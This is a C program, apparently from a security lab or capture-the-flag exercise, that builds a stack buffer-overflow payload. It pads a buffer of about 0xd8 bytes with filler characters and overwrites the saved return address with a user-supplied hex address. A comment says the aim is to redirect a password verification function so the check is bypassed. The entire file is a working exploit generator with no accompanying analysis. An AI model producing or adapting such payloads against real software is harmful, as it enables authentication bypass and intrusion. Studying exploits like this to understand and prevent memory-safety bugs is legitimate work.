#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_OFFS 0xd0

#define USAGE_MSG "Usage: %s ADDR\n"

static void
usage_err (char const *prog, char const *msg)
{
  if (msg)
    fputs (msg, stderr);

  fprintf (stderr, USAGE_MSG, prog);
  exit (EXIT_FAILURE);
}

int
main (int argc, char **argv)
{
  if (argc != 2)
    usage_err (argv[0], NULL);

  /* construct injection buffer */
  char inject[BUFFER_OFFS + 0x8];
  for (size_t i = 0u; i < sizeof (inject); ++i)
    inject[i] = 'a'; /* any printable character will do here */

  /* parse target address */
  char *endptr;
  uint32_t target_addr = (uint32_t) (strtol (argv[1], &endptr, 16));

  if (endptr - argv[1] != strlen(argv[1]))
    {
      usage_err (argv[0], "ADDR must be an unsigned hexadecimal 32-bit address "
                          "(without leading `0x')\n");
    }

  if (target_addr < 0l || target_addr > (long) UINT32_MAX)
    usage_err (argv[0], "ADDR is out of range\n");

  /* change the password verification functions return address
     (should be 0x8048473) */
  memcpy (&inject[BUFFER_OFFS + 0x4], &target_addr, 4);

  for (uint32_t i = 0u; i < BUFFER_OFFS + 0x8; ++i)
    printf ("%c", inject[i] & 0xff);

  putchar('\n');

  return 0;
}
